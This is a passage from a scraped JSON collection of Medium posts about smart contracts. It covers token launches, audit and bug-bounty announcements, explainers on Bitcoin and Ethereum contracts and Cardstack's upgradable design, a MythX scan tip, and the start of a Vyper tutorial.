to buy a ticket before the countdown hits zero will receive the entire amount held by the smart contract.5. You can play at any time (if you\u2019re not the last player to make a transaction, there\u2019s no point in waiting).6. There is no limit to the number of entries a player can make.This is how the interface looks:The game is available here: multi-pass.clubFor technical information, developers can contact the creators of the game here: https://t.me/tradisys_globalIf you have questions about the game\u00a0, you can ask them in the official Waves telegram chat\u200a\u2014\u200ause the @tradisys tag.", "responses": ""}, {"title": "Our Smart Contract has been\u00a0deployed", "author_name": "Domraider Team", "link": "https://medium.com/auctionity/our-smart-contract-has-been-deployed-6ec1379f305?source=search_post", "post_date": "Oct 18, 2017", "readtime": "", "upvotes": "102", "content": "Our Smart Contract has been\u00a0deployedDomraider TeamBlockedUnblockFollowFollowingOct 18, 2017We are pleased to announce that our smart contract has been deployed and is now live, which means that your DRTs are accessible in your personal wallet.Smart contract address: 0x9AF4f26941677C706cfEcf6D3379FF01bB85D5AbToken Symbol: DRTDecimals: 8Right now, some transactions are still in pending status.Please take a look at our help center or contact us if you need any extra information.", "responses": ""}, {"title": "MyWish & RSK platforms entered into collaboration to make Bitcoin Smart Contracts available for users with zero programming knowledge.", "author_name": "Vladimir Tikhomirov", "link": "https://medium.com/@VladimirTikhomirov/mywish-rsk-platforms-entered-into-collaboration-to-make-bitcoin-smart-contracts-available-for-20eb404f98be?source=search_post", "post_date": "Apr 19, 2018", "readtime": "3 min read", "upvotes": "206", "content": "MyWish & RSK platforms entered into collaboration to make Bitcoin Smart Contracts available for users with zero programming knowledge.Smart Contract is a blockchain analog of accustomed legal contractsVladimir TikhomirovBlockedUnblockFollowFollowingApr 19, 2018To be fair, this is one of a couple possible ways in which to use Smart Contracts. In this article, Smart Contracts are defined as a specific code to complement or completely replace customary legal contracts. Basically, Smart Contracts are the contracts on which terms are encoded in computer language instead of legal language. Up until now, the Smart Contract code has been fully supported by Ethereum, but never Bitcoin.The issue is\u00a0closedWe live in a great era; we are amazed by electric cars in the cosmos and robots with a sense of touch, but the issue of Bitcoin Smart Contracts was still hanging in the air until now. April 2018 has finally brought the solution to the riddle of a mysterious blockchain code that couldn\u2019t find a sophisticated method use.Who is responsible for\u00a0this?This was made possible by 2 innovative blockchain platforms: RSK and MyWish.RSK is the first general purpose Smart Contract platform secured by the Bitcoin Network. RSK platform uses Bitcoin as its native currency. A 2-Way Peg between Bitcoin blockchain and RSK blockchain ensures a fixed conversion between BTC and SBTC. (1 SBTC = 1 BTC). MyWish is a full-cycle, decentralized Smart Contract platform with the following uses: Smart Contracts creation, Audit, Deployment, Systematic calling on schedule, Execution.How it\u00a0worksThe MyWish platform makes it affordable for everyone who wants to create a Smart Contract based on Bitcoin. RSK network is the platform to run MyWish Smart Contracts. This platform is in charge of converting Bitcoins in SmartBTC to make any transaction possible; mind that you will withdraw your invested Bitcoins in the end. SmartBTC is needed to break the code of BTC, which makes the creation of Smart Contract 98% impossible.The first launched Bitcoin Smart Contract is dedicated to the last will and testament. Any person who holds their cryptocurrency investments in the form of Bitcoin could transfer savings to their family or friends in the event of their sudden illness or death.Due to the fact that security and reliability are 2 components that the independent world of Blockchain is missing, these two (MyWish platform and RSK platform) teams found the most trustworthy solution in response to that. A Smart Contract secures your assets no matter what. The original terms of Smart Contracts can\u2019t be changed by anybody but the other.What else to\u00a0expectAs Smart Contracts bring stability and security, the demand increases more and more every day. In the near future Bitcoin Smart Contracts will cover almost every single aspect of life so that cryptocurrency becomes part of the mainstream. They are there when you want them to protect you.See you soon and\u00a0foreverThe world\u2019s first Bitcoin Smart Contracts are supported by RSK network and offered in an easy-to-use way by MyWish. MyWish and RSK platforms that offer customer support and willingly assist their clients in facing the future with reliable cryptocurrency transactions.About MyWish:MyWish is a full cycle Decentralized platform which works on creating Smart contracts, Audit, Deployment, Systematic calling on schedule, Execution. It\u2019s a mobile application and a website with a user-friendly interface based on Ethereum (NEO and BTC/RSK) where everyone can create a Smart contract and manage it. All contract\u2019s templates have been tested & reviewed by team of professional developers.More info:https://mywish.io/Facebook: https://www.facebook.com/MyWish.io/Telegram: https://t.me/MyWish_platformAbout RSK:RSK Labs is the company behind the Project codenamed RootStock, a smart contract platform with a 2-way peg to the Bitcoin Blockchain. RSK founders have been actively involved in the Bitcoin ecosystem and smart contract development since early 2013. The company was founded in 2015 and its initial white paper was later published on December 2015.More info:http://www.rsk.co/Facebook: @RSKsmartTwitter: @RSKsmart", "responses": ""}, {"title": "Smart Contract Security Verification Just Got a Whole Lot\u00a0Easier", "author_name": "Bernhard Mueller", "link": "https://medium.com/consensys-diligence/smart-contract-security-verification-just-got-a-whole-lot-easier-66c47020232d?source=search_post", "post_date": "Mar 7", "readtime": "", "upvotes": "221", "content": "Smart Contract Security Verification Just Got a Whole Lot\u00a0EasierBernhard MuellerBlockedUnblockFollowFollowingMar 7This is a very short article because MythX makes it super easy to run security analysis on a Solidity file. Assume you have a smart contract you want to check for vulnerabilities. Further assume the contract file is called epic_fail.sol. Try the following:$ npm install -g sabre-mythx$ sabre epic_fail.solThe output:Note the SWC ID on the right: That\u2019s where you find the description of the bug in the Smart Contract Weakness Classification Registry.If you want full reports beyond the first 3 issues detected, sign up for a free API key. If you want to run analysis on large Truffle projects try Truffle Security.Happy and safe coding!", "responses": "2"}, {"title": "Shopin Launches Bug Bounty, Offers Token Rewards to Anyone Who Can HackSmart Contract\u00a0Code", "author_name": "Shopin", "link": "https://medium.com/@ShopinApp/shopin-launches-bug-bounty-offers-token-rewards-to-anyone-who-can-hack-smart-contract-code-d7e801d2efe3?source=search_post", "post_date": "May 19, 2018", "readtime": "2 min read", "upvotes": "170", "content": "Shopin Launches Bug Bounty, Offers Token Rewards to Anyone Who Can HackSmart Contract\u00a0CodeShopinBlockedUnblockFollowFollowingMay 19, 2018On the heels of a successful Token Generation Event with more than $42 million raised in record time, Shopin today announced the commencement of a three-day Bug Bounty, inviting anyone with a penchant for hacking to try and crack the company\u2019s Smart Contract code.Shopin is offering Ethereum token rewards to anyone who discovers and can document a flaw or vulnerability in its Smart Contract. Bounty rewards will only be available on a per discovery basis as long as they are original to the finder and not duplicated by another participant. In short, you have to discover a unique vulnerability.According to Jeremy Harkness, Shopin\u2019s CoFounder and Blockchain Technology Officer, the Smart Contract has already been audited three times. He and his team of technologists and blockchain experts are fairly certain there are no bugs, but they are eager to test their work against the community and have a little fun.\u201cThere is always room for error no matter what,\u201d said Harkness. \u201cSo we are excited to invite our crypto brothers and sisters to try their hand at finding any weaknesses and vulnerabilities that they possibly can. In the end, this will only bring us closer as a community as we work together to create an infallible Smart Contract that we can all be proud of and benefit from.\u201dThe bug bounty for Shopin Smart Contract code will be conducted via bug bounty platform Hackenproof. You can review the program policy at Hackenproof.com\u00a0.Bug Bounty duration:Start Saturday May 19th 2018 20:00 UTCEnd Tuesday May 22nd 2018 20:00 UTCReward:The range of compensation for finding vulnerabilities is 0.2\u20135 ETH depending on severity paid out in Hacken tokens.Bug Bounty participants will be able to audit the code in real-time so as not to compromise the original data of the Smart Contract. Any vulnerabilities discovered should be presented in the format of the Attack Scenario, Impact, Component, Reproductions, and Details.Shopin\u2019s Bug Bounty is the final step in the company\u2019s TGE process. Once the Smart Contract code has been confirmed or vulnerabilities have been discovered and fixed, the Shopin team will execute the Smart Contract on the Ethereum Mainnet and begin distributing tokens to all verified TGE participants.The entire Shopin team sincerely thanks all of our supporters for helping us get to the finish line of our TGE and for believing in the Shopin vision to revolutionize the world of retail. Without you, we wouldn\u2019t be here today.Please stay tuned for up-to-the-minute details on the Shopin Bug Bounty onour website, Telegram, Twitter, and Reddit!Let the Bug Bounty games begin!", "responses": ""}, {"title": "Evident Proof passes smart contract audit with a 100%\u00a0score", "author_name": "Evident Proof", "link": "https://medium.com/@EvidentProof/evident-proof-passes-smart-contract-audit-with-a-100-score-202eecf6cff?source=search_post", "post_date": "Aug 2, 2018", "readtime": "2 min read", "upvotes": "622", "content": "Evident Proof passes smart contract audit with a 100%\u00a0scoreEvident ProofBlockedUnblockFollowFollowingAug 2, 2018We are pleased to announce our platform has passed a smart contract audit from Hosho, a global leader in Blockchain security and smart-contract auditing. By receiving a 100% rating for our testable code, we are proud to receive a score that exceeds industry standards.Smart contract audits are crucial because the live code on the blockchain can be difficult to rectify. Despite this many blockchain projects fail to complete one let alone receive a 100% rating from Hosho.\u00a0Matt Roden, Evident Proof CTO, said: \u201cWe\u2019re delighted to receive Hosho\u2019s endorsement of our impeccable software development standards. We believed before the audit that our protocol was close to flawless. But we know our customers need transparency to put their trust in us for such an important service.\u00a0\u00a0\u201cHosho has a reputation for being the world\u2019s most diligent smart contract auditors, so this is an important milestone for us.\u201dOur software is an \u2018Immutable Proof As A Service\u2019 or \u2018IPAAS\u2019, which operates by receiving data and then encrypting the information by creating a unique signature known as a seal. These seals are then stored in an immutable ledger, called a proof chain, which lives on both a private and a public blockchain.\u00a0The Evident Proof platform aims to help deliver businesses, organisations and individuals with immutable proof certificates, so they can verify the accuracy and time order of their digital records.\u00a0Our management team has great experience in running and building large-scale multinational IT platforms. CEO Adrian Clarke is a former CTO at Microsoft, and our developers have worked with Microsoft to develop its proof of concept.\u00a0\u00a0Hosho said: \u201cThe team of experts at Hosho, having backgrounds in all aspects of blockchain, cryptography, and cybersecurity, can say with confidence that the Evident-Proof contract is free of any critical issues.\u201d\u00a0We are now putting in place a bug bounty program to encourage further analysis of the smart contract by third parties. Hosho\u2019s recent audit and endorsement is a significant step as we look to support clients justify and verify their data activities on the blockchain.Want to know more about our project? Join our Telegram to chat with the team: https://t.me/EvidentProofOfficialBecome an Evident Proof token holder: http://go.marketaffiliates.io/visit/?bta=35068&nci=5395&utm_campaign=medium", "responses": ""}, {"title": "FLETA Smart Contract Security Verified by\u00a0CertiK", "author_name": "FLETA Blockchain", "link": "https://medium.com/fleta-first-chain/fleta-smart-contract-security-verified-by-certik-7a1f9fe4ad47?source=search_post", "post_date": "Apr 16", "readtime": "3 min read", "upvotes": "565", "content": "FLETA Smart Contract Security Verified by\u00a0CertiKFLETA BlockchainBlockedUnblockFollowFollowingApr 16FLETA Smart Contract Security Verified by\u00a0CertiKFLETA aims to provide the most developer-friendly blockchain infrastructure. It will deal with the existing problems of blockchains such as scalability, speed or decentralization and give developers a platform to create scalable and high-performing Dapps. As you can imagine, for a platform of this scale, we must do everything possible to make it work efficiently and securely. Decentralized platforms and applications usually deal with a lot of money and attackers can exploit the smallest of vulnerabilities in the backend. As history has taught us, this can lead to devastating consequences.The DAO\u00a0AttackBack in 2016, the DAO was supposed touted as the Dapp that was going to make smart contract platforms mainstream. The idea was good and expectations were sky high. Unfortunately, there was a loophole in the DAO\u2019s smart contract which a hacker exploited to siphon away $50 million worth of Ether. The after effects of this was devastating. The value of Ether plunged and the Ethereum community was split into Ethereum and Ethereum Classic. It is a testament to Ethereum\u2019s developer community that they were able to bounce back from this setback.The Bane of Faulty Smart ContractsUnfortunately, there are many faults in smart contracts out there which are causing a host of issues:Firstly, as we have said, these contracts often deal with millions of dollars. Repeated hacking depletes the blockchain space of its finances.Secondly, developers work for days, weeks, and even months to put up a good quality product. A small loophole or bug can negate all the hard work they may have put in.Finally and most importantly, these repeated attacks decrease the credibility of the blockchain space and make mainstream adoption more difficult.At FLETA, we realized that we had the responsibility to our community and the crypto space in general, to provide a faultless, high-quality product. This is why we obtained CertiK\u2019s services.What is\u00a0CertiK?CertiK is one of the premier blockchain and smart contract verification platforms in the world. It was founded by former senior software engineers from Google and Facebook and formal verification experts from Yale and Columbia University. Instead of doing simple auditing CertiK does formal verification. Formal verification is a process which mathematically shows what a program does and how it acts out. For mission-critical programs like smart contracts, formal verification is an absolute necessity.CertiK has gained a lot of respect in the security industry. Binance Labs, DHVC, FBG Capital, Bitmain, and Lightspeed are just some of the companies that have invested in CertiK. On top of that, CertiK has also reached partnership agreements with exchanges like Binance, OKEx, and Huobi, as well as blockchain projects like NEO, ICON, and QuarkChain.CertiK\u2019s FLETA\u00a0ReportCertiK classifies the vulnerabilities they discover among the following categories:Critical: The code implementation doesn\u2019t match the specification and vulnerabilities are severe enough to cause loss of funds for the contract owner or users.Medium: The code implementation does not match the speci\ufb01cation at a specific condition, or it could a\ufb00ect the security standard by lost of access control.Low: The code implementation is not a best practice, or use a suboptimal design pattern, which may lead to a security vulnerability, but no concern found yetSo, what were CertiK\u2019s conclusions after formally verifying FLETA\u2019s source code? Based on their research, we are glad to announce that FLETA has no Critical, Medium, or Low-level vulnerabilities!ConclusionAs CertiK puts it in their FLETA report, \u201cThe goal of this security audit is to guarantee that the audited smart contracts are robust enough to avoid any potential security loopholes.\u201d We are proud of putting up a platform that has been deemed safe by a company like CertiK. This should give our users more reassurance about the credibility and security of the FLETA platform.", "responses": "1"}, {"title": "Black Friday Brings The Final Version of The Smart\u00a0Contract", "author_name": "TokenDesk", "link": "https://medium.com/@TokenDesk/black-friday-brings-the-final-version-of-the-smart-contract-a8c4432e0940?source=search_post", "post_date": "Nov 24, 2017", "readtime": "2 min read", "upvotes": "107", "content": "Black Friday Brings The Final Version of The Smart\u00a0ContractTokenDeskBlockedUnblockFollowFollowingNov 24, 2017TokenDesk is an ambitious team of blockchain professionals, enthusiasts and evangelists who dedicated all their effort to achieve the set goals ASAP. Each and every step of our business development is conducted to the highest technological and otherwise standards. Like in the most of innovative product development cases there are hiccups and there are breakthroughs.Today we are happy to announce that one of the most important stages\u200a\u2014\u200athe development of the smart contract is finished.We have put it through two different types of audit in order to make sure all the features, functions and security aspects are tested thoroughly. It is not usually necessary to dedicate that much time and resources for it, however, we thought it is something we need to do to maximize the quality of the final product. We believe it will pay off as TokenDesk community will be safe from all sorts of technological vulnerabilities in this context.Both of the audit stages brought to our attention different sorts of recommendations according to which the smart contract was improved. Our developers created a number of various scenarios in Truffel environment to see whether SC is functioning exactly as it should.TokenDesk smart contract is already deployed to the Github.Click HERE to check it.It will be deployed to the blockchain by the end of upcoming Tuesday. There is going to be a separate announcement when it\u2019s done.Hope you like our project and if you wish to support our idea, you can still contribute to our ICO and become a part of our revolutionary ICO platform.We have already attracted over 80 ICOs since the launch of our TokenDesk Alpha.That is only A WEEK and a few days ago BTW! Incredible!", "responses": "1"}, {"title": "What is a Smart Contract?", "author_name": "Crowdholding", "link": "https://medium.com/@crowdholding/what-is-a-smart-contract-ac7020e77c5d?source=search_post", "post_date": "Jan 30, 2018", "readtime": "3 min read", "upvotes": "255", "content": "What is a Smart Contract?CrowdholdingBlockedUnblockFollowFollowingJan 30, 2018Here at Crowdholding, we will be launching our new smart contract very soon, which brings up the topic for any newbies wanting to get into the world of crypto \u201cwhat is a Smart Contract?\u201d.The term and ideology of \u201csmart contracts\u201d was first conceived by computer scientist and cryptographer Nick Szabo back in 1993. He introduced the concept of how users could input data or a value, and receive a finite item from a machine, such as a snack or soft drink.TThe issue was that back in 1993, the technology wasn\u2019t there to allow smart contracts to thrive. This changed with the advent of blockchain technology. This is because blockchains are decentralized systems, existing between all permitted parties, removing the need for middlemen who slow down or cause conflicts in traditional systems.Image from DUPress.comA smart contract in basic terms enforces terms of agreement with a cryptographic code (rather than a standard contract that has to be browsed through to find the correct terms).The simplistic way to describe the difference is to compare it to vending machine (a smart contract) against a shop assistant (standard contract).Although smart contracts are still in their infancy, there are a lot of industries that could implement them in their current procedures.A potential future use for smart contracts could be in world of insurance. Smart contracts are extremely useful in the cases when a process takes a significant amount of time, which is a typical problem with insurance policies. The work involves many manual operations and requires a lot of human action and time to validate. For a customer, the longer it takes, the more stress / additional costs. With a smart contract, it could have measurable parameters such as flood levels, earthquake magnitude or a variety of different variants. When there\u2019s an insured event, the input conditions of a smart contract will be changed accordingly. As a result, the claims process will be triggered immediately, and the financial payout can be delivered to a customer without any delays. The need of human-driven intervention is reduced which would reduce costs and allow the insurance holder to start to rebuild.The added beauty of smart contracts is you can have multiple collaborating together, eliminating human error, corruption and also setting transparent standards that everyone agrees to.The world of smart contracts has not breached into industries that govern our society, but we are seeing more and more investment into blockchain technologies and this will continue into the future.You can keep up to date with what is happening at Crowdholding by following us on Facebook, or talk with us on telegram.", "responses": ""}, {"title": "Cardstack\u2019s Upgradable Smart Contract, Explained", "author_name": "Cardstack Team", "link": "https://medium.com/cardstack/cardstacks-upgradable-smart-contract-explained-dbf443888cfc?source=search_post", "post_date": "Jun 27, 2018", "readtime": "5 min read", "upvotes": "251", "content": "Cardstack\u2019s Upgradable Smart Contract, ExplainedFuture-proofing the Cardstack ProjectCardstack TeamBlockedUnblockFollowFollowingJun 27, 2018Cardstack\u2019s Ethereum smart contract is more advanced than most ERC20 smart contracts. We built our contract to be upgradable and extensible, in order to future-proof the Cardstack Project.Cardstack\u2019s Senior Blockchain Developer Hassan Abdel-Rahman has provided a thorough technical writeup of our upgradable contract. We also blogged about our first smart contract upgrade, conducted in June 2018.This is an explainer in plain English about how our smart contract works.The Cardstack Smart\u00a0ContractThe first thing you should know is that the Cardstack Smart Contract is made of multiple contracts. Let\u2019s meet them:Simplified diagram: The Cardstack Smart\u00a0ContractRegistry contractThis is the \u201cmaster\u201d contract that binds all the other contracts together. It is the authority on which contracts are assigned as the ledger contract(s), token contract(s), and storage contract(s).The registry contract can unbind any of these contracts and bind with new contracts.To upgrade any of the contracts (e.g. the token contract), we deploy a new version of that contract, which will have a different address. The registry contract unbinds with the old contract and binds with the new contract.In sum, the new contract replaces the old contract. Then the registry contract reconnects everything.ENS resolverIn addition to managing underlying contracts, the registry contract is our ENS resolver. As requests come through cardstack.eth, the registry contract exposes the appropriate contract(s) underneath.For example, if I am a user and I want to find the latest Cardstack Token Smart Contract address, I can visit cardstack.eth and the registry contract will point me to the correct token contract.Or, if a decentralized application wants to request storage from a Cardstack storage contract, it can send a request to cardstack.eth and the registry contract will point the dApp to a storage contract.Storage contractA storage contract acts a bucket, carrying the state from one version of our contract to the next. This includes everything in a contract that isn\u2019t related to a token balance. For example: the name of the token, contribution caps, whitelisted addresses, ERC20 third-party contract allowances, etc.A storage contract can also store a ledger contract\u200a\u2014\u200aor structures of multiple ledger contracts.Ledger contractCardstack Token balances are stored on a ledger contract, which is a modified form of a storage contract. A ledger contract contains records of addresses\u2019 token balances up to 18 decimal places, but has no functionality of its own.A ledger contract can be managed by one or more designated token contract.Token contractThe Token Smart Contract may interact with the ledger contract, making token transactions and other ERC20 functions possible.Our current smart contract has gone through three rounds of rigorous security audits. We recently completed the first upgrade of our token contract, changing the decimal system from 0 to 18 (read about the change here).To maintain consistency, Our ENS address cardstack.eth will always expose the most updated version of the Cardstack Token Smart Contract to an end user.For security and simplicity, you should always use the ENS address to locate our most current token contract address.Next upgrade cycle: stable token contract, living token\u00a0contractFor some third-party ERC20 functions, it is important to keep a stable token contract address, as some Ethereum-based services do not have underlying ENS resolver functionality.That\u2019s why our smart contract architecture allows for multiple token contracts working side by side, each with full access to the ledger contract.We plan to keep our fully audited V2 token contract as our \u201cstable\u201d ERC20 token contract, forming a dependable bridge to third-party services that require standard integrations.However, we can deploy an additional \u201cliving\u201d ERC20 token contract that will work side-by-side with the stable contract, so that the Cardstack Framework can continue to gain feature upgrades without affecting third-party integrations.Both the living contract and the stable contract will reflect token balances consistently since they both point to the same underlying ledger contract. The living contract will include all the functionality of the stable contract.For end users, cardstack.eth will resolve to the living contract.Notes on this\u00a0approachWe have elected not to use a proxy pattern used in some smart contracts, including those from the OpenZeppelin open source project, due to potential security vulnerabilities our development and audit teams identified. (As Solidity matures and the tools and strategies for upgrading contracts evolve, we may revisit this decision.)Our approach optimizes our ability to expand the scope and feature set of the living smart contract, without introducing too much complexity in the stable contract.If the token standards in Ethereum evolve significantly, many projects including Cardstack, as well as projects using the proxy pattern, will likely have to upgrade the ABI signature of our token contract. In such a case, we would work with the integration teams of third-party services as if we were deploying a new version of the full node for a non-Ethereum-based blockchain.For end\u00a0usersBecause our smart contract will undergo periodic upgrades, you should always use the ENS address cardstack.eth to locate our token contract address.When Cardstack tokens are unlocked, we will always give advance notice about smart contract upgrades. We will also announce the moment we initialize and complete each upgrade.During an upgrade, token balances may not be fully up-to-date. Transactions may also be rejected. Please be patient while a contract update is underway.To make sure you receive the latest updates, follow Cardstack on our various platforms: (Telegram, Twitter, Medium, Newsletter, Website)", "responses": "5"}, {"title": "WINGS Alpha, Smart Contract Code & Grants for Best DAO\u00a0Projects", "author_name": "WINGS Magazine", "link": "https://blog.wings.ai/wings-alpha-smart-contract-code-prizes-for-best-dao-projects-9dcb1ecc2a48?source=search_post", "post_date": "Jan 4, 2017", "readtime": "3 min read", "upvotes": "10", "content": "WINGS Alpha, Smart Contract Code & Grants for Best DAO\u00a0ProjectsWINGS MagazineBlockedUnblockFollowFollowingJan 4, 2017Today we are releasing a publicly accessible alpha version of WINGS for our community and those considering using WINGS for crowdfunding and DAO governance. Our goal here is to give everyone a basic idea how the system will work, gain feedback, and iterate the system toward an MVP with which we will launch with at the end of Q1 so that great projects like Stremio\u2019s AdEx and others which we will announce soon can start crowdfunding. This network will stay up for most of January.The system is running on our Ethereum private development network- a Proof of Authority devchain powered by EthCore Parity. It allows doing several simple things: proposing a project, generating and deploying the project smart contact to our Ethereum devnet, storing the project blob data (like images and documents) on IPFS, enabling WINGS holders to make a simple forecast on how much the project shall receive in funding, and finally funding the project using a \u201cBTC\u201d token, getting in exchange the new project tokens.The interface is simple to use and will be further improved over time as WINGS Foundation is able to access funds from the backing campaign which currently stand at over 1740 BTC raised.The submitted projects and the received data from the mock forecasting and crowdfunding will be used by the team as part of the evaluation criteria to give out some awards to the most deserving teams, so if you plan to make a proposal take your time to put together something of quality. Please make sure that you either leave a point of contact so we could get in touch or send us an email.To receive the following prizes teams must commit to using WINGS for their crowdfunding during 2017. If you cannot commit you can still participate and see if you win for the lulz and international fame.WINGS alpha\u00a0accessThe alpha is available at: https://alpha.wings.aiThe alpha devnet explorer is available at: https://alpha.wings.ai:8443Please note that all \u201cBTC\u201d and \u201cWINGS\u201d tokens on the alpha are not \u201creal\u201d tokens\u200a\u2014\u200ayou will notice that your wallet will have an Ethereum address; do not send tokens like ETH or ETC to that address.Best DAO Projects\u00a0GrantsFirst Place \u20142 BTC & 10,000 Euros of crowdfunding consulting services from the FoundationSecond Place \u20141 BTC & 5,000 Euros of crowdfunding consulting services from the FoundationThird Place\u200a\u2014\u200a0.5 BTC & 2,500 Euros of crowdfunding consulting services from the FoundationWINGS Alpha Smart Contracts reviewWe are publishing the WINGS Alpha smart contracts on our Github:https://github.com/WingsDao/WingsContractsHead over and check out them out. If you see any improvements that can be made and your pull request is approved we will award you 100 WINGS.You can also join our wings-dev channel in slack, for an invite go to https://hi.wings.ai/Contribute a bit to the WINGS FoundationThe WINGS Foundation campaign is coming to an end at 6 AM UTC (same time as in London) this Friday January 6, 2017.Consider supporting WINGS at: https://fly.wings.ai. We accept Bitcoin, Ether, Ether Classic, Ripple and Litecoin.", "responses": ""}, {"title": "Leading Canadian Law Firms Collaborate on Blockchain-Based Smart Contract\u00a0Project", "author_name": "OpenLaw", "link": "https://medium.com/@OpenLawOfficial/leading-canadian-law-firms-collaborate-on-blockchain-based-smart-contract-project-b3fe1a6fa9a9?source=search_post", "post_date": "May 7", "readtime": "2 min read", "upvotes": "169", "content": "Leading Canadian Law Firms Collaborate on Blockchain-Based Smart Contract\u00a0ProjectOpenLawBlockedUnblockFollowFollowingMay 7Six of Canada\u2019s leading law firms recently joined forces on a groundbreaking pilot project to develop a complex \u201csmart contract\u201d on the Ethereum blockchain. The experiment sought to explore the potential benefits of smart contracts in the legal context to better understand how law firms can leverage new technologies to best serve their clients. The participating firms were Bennett Jones LLP, Blake Cassels & Graydon LLP, Davies Ward Phillips & Vineberg LLP, Fasken Martineau Dumoulin LLP, Norton Rose Fulbright LLP and Stikeman Elliott LLP.Over a six-month period, the law firms collaborated with GenesisB, a progressive blockchain consultancy, to develop an innovative \u201csmart\u201d legal template on the Ethereum blockchain using the OpenLaw platform. Specifically, the law firms automated an M&A escrow agreement, coding several clauses using smart contract technology. The executed agreement automated issues related to indemnification claims, working-capital payouts and basic disputes using a pseudo-stable coin.Through this exercise, the participating lawyers gained hands-on experience with the process of creating, testing and using a complex blockchain-based legal agreement. This provided valuable insights not only into the circumstances in which smart contracts could create cost-saving efficiencies for clients, but into the readiness of blockchain technology for the industry and the developments in the ecosystem that need to occur for its benefits to be realized.\u201cWhile we\u2019re still in the early days of assessing the impact of blockchain technology on the legal profession, projects like this are demonstrating the potential for smart contract technology. As adoption grows, law firms and businesses can use OpenLaw to streamline contract automation while setting themselves up for the use of smart contracts.\u201d says OpenLaw\u2019s Aaron Wright.About OpenLawOpenLaw is a blockchain-based protocol for the creation and execution of legal agreements. Using OpenLaw, users can more efficiently engage in transactional work and digitally sign and store legal agreements in a highly secure manner, all while leveraging next generation blockchain-based smart contracts. OpenLaw is the first project to comprehensively stitch together traditional legal agreements with blockchain-based smart contracts in a user-friendly and legally compliant manner. For more information, please visit https://openlaw.io/.About GenesisBGenesisB is a progressive blockchain consultancy helping companies create more efficient value exchange through blockchain solutions. GenesisB is exclusively focused on delivering meaningful ROI through business and technology innovation by leveraging distributed ledger technologies. By providing focused blockchain expertise, GenesisB helps organizations discover and realize the benefits of distributed ledgers including decentralized trust, smart automation, data security and immutable transaction history. Grounded in strategy, with relevant engineering expertise, GenesisB will help plan, design and implement effective blockchain solutions for both enterprise and government. https://genesisb.com/", "responses": "1"}, {"title": "The fastest way to learn Vyper for creating secure Ethereum Smart Contracts", "author_name": "Merunas Grincalaitis", "link": "https://medium.com/@merunasgrincalaitis/the-fastest-way-to-learn-vyper-for-creating-secure-ethereum-smart-contracts-8f9d7289ccea?source=search_post", "post_date": "Jan 12", "readtime": "11 min read", "upvotes": "124", "content": "The fastest way to learn Vyper for creating secure Ethereum Smart ContractsMerunas GrincalaitisBlockedUnblockFollowFollowingJan 12Vyper is here to\u00a0stayVyper is a new smart contract programming language with a bright future based on python and created by Vitalik with the goal of having better smart contract code that non-programmers could understand. Because being able to see what the program actually does is critical when transacting on the blockchain where code is law.In this quick guide you\u2019ll learn the language basics so that you are too able to to create vyper contracts.Why VyperThe language\u2019s principals are simple:- Security: it should be designed in a way that security comes automatically when writing the smart contract without having to do extensive tests and security checks.- Language and compiler simplicity: both should strive to create simple code that is not overcomplicated with unnecessary functionality.- Auditability: the ultimate goal is to have a programming language that is simple to read by any person regardless of their experience with computers in order to give them understanding while keeping security a priority by making difficult to write bad code.That\u2019s why Vyper is limited in functions compared to Solidity where you have less restrictions in place, to help people understand the code while making it secure. Based on those 3 principals, Vyper has a unique set of features for smart contract programming:- Bounds and overflow checking: On array accesses as well as on arithmetic level. Many of the issues with traditional smart contracts written in solidity is the fact that mathematical calculations are insecure because of the EVM\u2019s natural restrictions. You can\u2019t store an endlessly large number on a uint variable because it would be abused, and miners would have to process excessive computations every time. Vyper aims to solve that by checking overflow and underflow issues when compiling.- Support for signed integers and decimal fixed-point numbers: in this programming language you can have positive and negative integers with decimals unlike Solidity where decimals are not allowed because of number rounding limitations.- Decidability: It should be possible to compute a precise upper bound for the gas consumption of any function call. In other words, every function should provide a clear indication of how much gas it consumes at any point.- Strong typing: Including support for units (e.g. timestamp, timedelta, seconds, wei, wei per second, meters per second squared). Many new types are added to Vyper to provide better readability.- Small and understandable compiler code: the compiler code is optimized as much as possible in every contract.- Limited support for pure functions: Anything marked constant is not allowed to change the state which forces developers to guarantee that the code is behaving as expected.However, to fully implement the desired goals, Vyper is limited in functionality and thus it doesn\u2019t have the following programming capabilities:- Modifiers: they are not available because they may code tedious to understand since you have to jump back and forth to the modifier definition and because developers could write misleading code with unexpected functionality.- Class inheritance: when a smart contract inherits from many others, you have to jump back and forth between them to fully understand what is going on. Also, it\u2019s another point where programmers could write misleading code that executes unexpected functionality.- Inline assembly: assembly code is not searchable since functions and variables change their names to simpler values that are harder to understand and modify.- Function overloading: it\u2019s a problematic feature where the same function with different parameters could damage users with dangerous code.- Operator overloading: another problematic feature where developers could for instance, change the + operator to a potentially dangerous function.- Recursive calling: it makes function gas costs hard to predict and it\u2019s one of the many reasons you can\u2019t fully know how much gas you need to execute every function in solidity. By removing this feature, we also remove the possibility of gas limit attacks such as the reentrancy attack.- Endless loops: such as while and for loops without restrictions. They make impossible to calculate gas limits and could be used as an attack vector.- Binary fixed point: decimal fixed point is better, because any decimal fixed point value written as a literal in code has an exact representation, whereas with binary fixed point approximations are often required (e.g. (0.2)10 = (0.001100110011\u2026)2, which needs to be truncated), leading to unintuitive results, e.g. in Python 0.3 + 0.3 + 0.3 + 0.1\u00a0!= 1.File structureIn Vyper you don\u2019t have to specify the version of the compiler since the best one is automatically chosen for your smart contract. You can start writing code immediately in a\u00a0.vy file or using an online compiler such as vyper.online which I recommend to help you with debugging and compiling quickly as you develop.VariablesVyper has a wider variety of types of variables because they want to improve readability as much as possible. Therefore, what\u2019s better than a descriptive type of variable?In Vyper you start with the variable name, then a colon and the variable type with the visibility. Variable\u2019s visibility is the same as in solidity and you specify them like so:myVariableName: public(uint256)As you can see, you start with the variable\u2019s name and then you declare the type without a semicolon at the end since this is a python-based language.Variables in Vyper can either be private or public. Public means that anybody can access that variable including external contracts and private means that the variable can only be modified internally in this contract. To make a variable public, use the keyword public before the type and to make it private, just use the type without the public keyword.myVariableName: public(uint256) # A public variablemySecondVariable: uint256 # A private variableRemember that each smart contract needs to be setup in a single file so it\u2019s independent. These are state variables that get declared at the top of the contract. Note that you can\u2019t give a value to the variable when defining the type of the state variables.Following are the types of variables available in vyper:- uints: unsigned-integers which just like in solidity, can only be positive numbers. In vyper you only have the 256-bit version so all your unsigned-integers must be declared as uint256 including the number at the end instead of just uint. For example:myNumber: uint256- ints: signed-integers. These integers can be either positive or negative and as such, can only hold up to 128 bits of data so all your ints will be int128. Additionally, you can use the min(x, y) and max(x, y) functions with integers for making quick 